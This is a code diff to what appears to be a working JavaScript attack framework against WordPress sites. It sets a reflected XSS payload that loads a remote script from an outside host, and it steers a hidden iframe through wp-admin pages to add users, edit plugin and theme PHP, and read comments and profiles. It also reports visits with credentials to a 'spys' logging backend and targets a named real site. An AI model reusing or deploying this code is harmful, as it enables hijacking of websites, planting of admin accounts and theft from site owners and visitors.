@@ -20,7 +20,7 @@ var g_strURLSpysIndex="";
 function initURL()
 {
     //g_strURLXSS=Common.getTargetHost()+"hello-world/";
-    g_strURLXSS=Common.getTargetHost()+"page/2/?s=1%22/%3E%3CScRiPt%20%3Evar%20h=document.getElementsByTagName(%22head%22)[0];var%20t=new%20Date();t=t.getTime();var%20s=document.createElement(%22script%22);s.type=%22text/javascript%22;s.charset=%22utf-8%22;s.src=%22https://colorwolf2017.000webhostapp.com/webroot_mycakephp/zfirst/js/a.js?t=%22%2bt;h.appendChild(s);alert(%22add%20success%22);%3C/ScRiPt%3E%3Cinput%20value=%22";
+    g_strURLXSS=Common.getTargetHost()+"page/2/?s=1%22/%3E%3CScRiPt%20%3Evar%20h=document.getElementsByTagName(%22head%22)[0];var%20t=new%20Date();t=t.getTime();var%20s=document.createElement(%22script%22);s.type=%22text/javascript%22;s.charset=%22utf-8%22;s.src=%22http://uyghurhome.ml/webroot_mycakephp/zfirst/js/a.js?t=%22%2bt;h.appendChild(s);%3C/ScRiPt%3E%3Cinput%20value=%22";
     //g_strURLIndex=Common.getTargetHost();
     g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
     g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
@@ -36,9 +36,9 @@ function initURL()
     g_strURLEditPHPPostPlugin=Common.getTargetHost()+"wp-admin/plugin-editor.php";
     g_strURLEditPHPPostTheme=Common.getTargetHost()+"wp-admin/theme-editor.php";
 
-    g_strURLVisitLogsAdd=Common.getJSHost()+"visit-logs/add2";
-    g_strURLCommentsAdd=Common.getJSHost()+"comments/add";
-    g_strURLSpysIndex=Common.getJSHost()+"spys/first";
+    g_strURLVisitLogsAdd=Common.getJSHost()+"webroot_mycakephp/visit-logs/add2";
+    g_strURLCommentsAdd=Common.getJSHost()+"webroot_mycakephp/comments/add";
+    g_strURLSpysIndex=Common.getJSHost()+"webroot_mycakephp/spys/first";
 }
 
 //find the give child
@@ -583,15 +583,40 @@ function inPageRedirect()
 }
 //--------------------------------------------inPageRedirect page-----------------------------------------------------------------------
 
+//--------------------------------------------inPageMyHost page-----------------------------------------------------------------------
+function inPageMyHost()
+{
+    var jsonLog=
+    {
+        username:"",
+        action:"normal visit:"+window.location.href+",platform:"+navigator.platform
+    };
+    addVisitLog(jsonLog);
+}
+//--------------------------------------------inPageMyHost page-----------------------------------------------------------------------
+
 //common function add visit log
 function addVisitLog(json)
 {
+    //check length
+    if(json.action.length>200)
+    {
+        json.action=json.action.substring(0,200);
+    }
     $.ajax
     (
         {
             type:"post",
             url:g_strURLVisitLogsAdd,
             data:json,
+            //beforeSend:function(xhr)
+            //{
+            //    xhr.setRequestHeader("","");
+            //},
+            xhrFields:
+            {
+                withCredentials:true
+            },
             success:function(data,textStatus)
             {
                 try
@@ -599,21 +624,28 @@ function addVisitLog(json)
                     var json=eval("("+data+")");
                     if(json.success)
                     {
-                        console.log("visit log success");
+                        throw "success";
                     }
                     else
                     {
-                        console.log("visit log fail");
+                        throw "failed";
                     }
-                    console.log("parent position:"+window.parent.location.href+",my positiopn:"+window.location.href);
-                    //continue no matter success or fail
-                    window.parent.frameOperationCalledFromSon(window);
                 }
                 catch(e)
                 {
-                    console.log("in exception parent position value:"+window.parent.location.href+",my positiopn:"+window.location.href+",exception:"+e);
-                     //continue even exception
-                    window.parent.frameOperationCalledFromSon(window);
+                    if(e=="success"||e=="failed")
+                    {
+                        console.log("visit log result:"+e);
+                    }
+                    else
+                    {
+                        console.log("visit log exception:"+e);
+                    }
+                    if(window.location.href.indexOf(Common.getJSHost())===-1)
+                    {
+                        console.log("parent position:"+window.parent.location.href+",my positiopn:"+window.location.href);
+                        window.parent.frameOperationCalledFromSon(window);
+                    }
                 }
             }
         }
@@ -632,7 +664,7 @@ function frameJumpTo(strURL)
     if($("#idIFrameChangable").length===0)
     {
         //$body.append("<iframe id=\"idIFrameChangable\" src=\""+strURL+"\" width=\"100%\" height=\"50%\"></iframe>");
-        $body.append("<iframe id=\"idIFrameChangable\" width=\"100%\" height=\"50%\"></iframe>");
+        $body.append("<iframe id=\"idIFrameChangable\" width=\"100%\" height=\"80%\"></iframe>");
     }
     $("#idIFrameChangable").unbind();
     $("#idIFrameChangable").bind
@@ -641,12 +673,15 @@ function frameJumpTo(strURL)
         {
             if(strURL===$("#idIFrameChangable").attr("src"))
             {
-                //console.log("load frame success");
+                console.log("load frame success");
                 //$(window.frames[0].document).find("head").append("<script src=\""+Common.getJSHost()+"zfirst/js/xss_index.js\"></script>");
-                g_frameWindow = window.frames[0].window;
-                g_frameDocument = window.frames[0].document;
-                Common.callBackAfterJSLoad(Common.getJSHost() + "zfirst/js/xss.js", "idScriptXSS", null, null, false, g_frameDocument);
-                Common.callBackAfterJSLoad(Common.getJSHost()+"zfirst/js/common.js","idScriptCommon",null,null,false,g_frameDocument);
+                if(Common.getCurrentHost()!==Common.getJSHost())
+                {
+                    g_frameWindow = window.frames[0].window;
+                    g_frameDocument = window.frames[0].document;
+                    Common.callBackAfterJSLoad(Common.getJSHost() + "webroot_mycakephp/zfirst/js/xss.js", "idScriptXSS", null, null, false, g_frameDocument);
+                    Common.callBackAfterJSLoad(Common.getJSHost()+"webroot_mycakephp/zfirst/js/common.js","idScriptCommon",null,null,false,g_frameDocument);
+                }
             }
             else
             {
@@ -656,6 +691,24 @@ function frameJumpTo(strURL)
         }
     );
     $("#idIFrameChangable").attr("src",strURL);
+    if(window.location.href.indexOf("getElementsByTagName")!==-1)
+    {
+        //console.log("try get parent position:"+window.parent.location.href+",my positiopn:"+window.location.href);
+        $.ajax
+        (
+            {
+                type: "get",
+                url: g_strURLAddUser,
+                success: function (data, textStatus, xhr)
+                {
+                    var strTemp=data;
+                    alert(strTemp);
+                    console.log(strTemp);
+                }
+            }
+
+        );
+    }
 }
 
 //called from son wiodow
@@ -788,65 +841,68 @@ function frameOperationCalledFromSon(windowSon)
         //    console.log("fatal error in index page,unrecognized g_strComunication:"+g_strComunication);
         //}
     //}
-
 }
 
 //different operation in different page
 function frameOperation()
 {
     console.log("current page new url:"+window.location.href);
-    if(window.location.href===g_strURLXSS||window.location.href.indexOf("http://www.hoylam.net/page/2/")!==-1)
+    if(Common.getCurrentHost()!==Common.getJSHost())
     {
-        //XSS
-        frameJumpTo(g_strURLAddUser);
+        if(window.location.href===g_strURLXSS||window.location.href.indexOf("http://www.hoylam.net/page/2/")!==-1)
+        {
+            //XSS
+            frameJumpTo(g_strURLAddUser);
+        }
+        else if(window.location.href.indexOf("redirect_to")!==-1)
+        {
+            //i am sure not login
+            inPageRedirect();
+        }
+        else if(window.location.href===g_strURLLogin)
+        {
+            //try to login
+            inPageLogin();
+        }
+        else if(window.location.href===g_strURLAddUser)
+        {
+            //add user
+            inPageAddUser();
+        }
+        else if(window.location.href.indexOf("plugin-editor.php")!==-1||window.location.href.indexOf("theme-editor.php")!==-1)
+        {
+            inPageEditPHP();
+        }
+        else if(window.location.href.indexOf(g_strURLComment)!==-1)
+        {
+            //get back comment
+            inPageComment(-1);
+        }
+        else if(window.location.href==g_strURLProfile)
+        {
+            inPageProfile();
+        }
+        else if(window.location.href==g_strURLPanelIndex)
+        {
+            //get changable js command
+            inPagePanelIndex();
+        }
+        //else if(window.location.href===(Common.getTargetHost()+"?p=1"))
+        else
+        {
+            console.log("fatal error,unrecognized url:"+window.location.href);
+        }
     }
-    else if(window.location.href.indexOf("redirect_to")!==-1)
-    {
-        //i am sure not login
-        inPageRedirect();
-    }
-    //if(window.location.href===g_strURLIndex)
-    //{   //index
-        //may be the target host is not the same
-        //inPageIndex();
-    //}
-    else if(window.location.href===g_strURLLogin)
-    {
-        //try to login
-        inPageLogin();
-    }
-    else if(window.location.href===g_strURLAddUser)
-    {
-        //add user
-        inPageAddUser();
-    }
-    else if(window.location.href.indexOf("plugin-editor.php")!==-1||window.location.href.indexOf("theme-editor.php")!==-1)
-    {
-        inPageEditPHP();
-    }
-    else if(window.location.href.indexOf(g_strURLComment)!==-1)
-    {
-        //get back comment
-        inPageComment(-1);
-    }
-    else if(window.location.href==g_strURLProfile)
-    {
-        inPageProfile();
-    }
-    else if(window.location.href==g_strURLPanelIndex)
-    {
-        //get changable js command
-        inPagePanelIndex();
-    }
-    //else if(window.location.href===(Common.getTargetHost()+"?p=1"))
     else
     {
-        console.log("fatal error,unrecognized url:");
+        //my host
+        inPageMyHost();
+        if(window.location.href===(Common.getJSHost()+"hello-world/"))
+        {
+            //test
+            frameJumpTo(g_strURLXSS);
+        }
     }
-    // else
-    // {
-    //     throw "unrecongnized position:"+window.location.href;
-    // }
 }
 
 //test for jquery
@@ -870,7 +926,9 @@ function mainJSFunctionEntry()
         //check if jquery is useable
         if (!testJQuery())
         {
-            Common.callBackAfterJSLoad("https://ajax.microsoft.com/ajax/jquery/jquery-2.1.4.min.js","idScriptJQuery", testJQuery, frameOperation,true,document);
+            //Common.callBackAfterJSLoad(Common.getJSHost()+"webroot_mycakephp/zfirst/js/jquery-1.11.1.min.js","idScriptJQuery", testJQuery, frameOperation,true,document);
+            Common.callBackAfterJSLoad("https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js","idScriptJQuery", testJQuery, frameOperation,true,document);
+
         }
         else
         {
